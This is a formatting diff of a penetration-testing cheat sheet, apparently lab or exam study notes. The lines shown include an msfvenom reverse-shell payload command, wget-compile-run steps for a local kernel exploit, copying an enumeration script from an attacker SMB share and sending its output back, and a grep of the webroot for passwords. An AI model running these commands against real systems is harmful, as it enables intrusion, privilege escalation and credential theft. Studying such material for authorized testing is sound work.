@@ -326,11 +326,13 @@ Or
 ```call [ESP-200]```
 
 ```
-msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -b “\x0\x04\x2f\x3a” -o filename```
+msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -b “\x0\x04\x2f\x3a” -o filename
+```
 
 Make sure it fits your payload length above
 
 # Privilege Escalation 
+
 #### Linux
 searchsploit CentOS 4. | grep /local/ (look for kernel version)
 searchsploit linux kernel 4.4.0 | grep 16.04 (search by kernel, grep for release)
@@ -339,6 +341,7 @@ wget http://192.168.1.223/9495.c -P /var/tmp
 gcc -o centos45 9495.c 
 chmod +x centos45
 ./centos45
+
 #### Windows
 Searchsploit ??? | grep /local/ (look for?)
 windows-exploit-suggester.py -d 2019-05-17-mssb.xls -i sysinfo
@@ -351,8 +354,8 @@ smbserver.py leshare /var/www/html/scripts/
 copy \\10.10.14.19\leshare\Powerless.bat
 Powerless.bat > \\10.10.14.19\leshare\powerOUT.txt
 
-#### Priv-Esc Basic Enumeration
-Quick Wins - Credentials from (Web) Service files
+# Priv-Esc Basic Enumeration
+#### Quick Wins - Credentials from (Web) Service files
 If web services were running and was an avenue to enter (or not), check the webroot! Especially if there was a Logon Page - the checklogin.php file must have a mechanism to access the SQL database to authenticate users.. Check it 
 grep -r -i “password” /var/www/
 Examples:
